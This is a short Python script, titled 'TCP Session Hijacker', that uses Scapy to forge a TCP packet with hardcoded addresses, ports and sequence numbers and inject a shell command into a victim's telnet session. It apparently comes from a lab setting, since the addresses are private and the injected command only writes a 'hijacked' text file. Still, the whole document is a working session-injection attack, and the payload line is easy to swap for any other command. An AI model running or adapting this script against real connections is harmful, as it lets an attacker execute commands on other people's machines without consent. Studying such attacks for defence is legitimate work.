'''
TCP Session Hijacker
'''

# Imports Sys and Scapy libraries
import sys
from scapy.all import*

# Telnet session variables:
# IPLayer contains source and destination IP addresses
# TCPLayer contains TCP session source port, destination port, raw sequence and raw acknowledgement
# data creates text file on victim
IPLayer = IP(src="192.168.1.111", dst="192.168.1.112")
TCPLayer = TCP(sport=43526, dport=23, flags="A", seq=2651620721, ack=2018829632)
data = "echo Your session has been hijacked! > hijacked.txt\r\n"
pkt = IPLayer/TCPLayer/data
ls(pkt)
send(pkt, verbose=0)